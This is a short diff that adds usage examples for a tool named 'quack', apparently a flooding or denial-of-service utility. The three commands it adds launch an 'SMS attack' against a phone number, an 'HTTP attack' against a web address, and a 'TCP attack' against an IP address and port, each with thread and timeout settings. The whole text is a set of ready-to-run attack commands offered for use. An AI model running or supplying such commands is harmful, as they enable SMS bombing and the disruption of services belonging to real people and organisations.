@@ -1,0 +1,12 @@
+Example of the SMS attack
+quack --tool SMS --target +967712252319 --timeout 10 --threads 10
+ 
+
+Example of the HTTP attack
+quack --tool HTTP --target http://example.com/ --timeout 10 --threads 10
+
+
+Example of the TCP attack
+quack --tool TCP --target 192.168.88.1:21 --timeout 10 --threads 10  
+
+
